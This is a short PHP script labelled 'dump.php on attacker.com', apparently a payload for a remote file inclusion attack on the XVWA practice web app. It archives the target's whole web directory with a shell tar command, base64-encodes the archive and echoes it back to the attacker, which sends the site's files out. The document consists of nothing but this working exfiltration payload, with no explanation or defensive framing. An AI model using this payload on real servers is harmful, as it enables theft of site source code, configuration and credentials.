<?php
// dump.php on attacker.com
$src = 'C:/xampp/htdocs/xvwa';
$tmp = sys_get_temp_dir() . '/all_xvwa.tar';
// Create a tar.gz of the entire directory
passthru("tar -czf $tmp $src");
// Send it back base64-encoded
echo base64_encode(file_get_contents($tmp));
unlink($tmp);
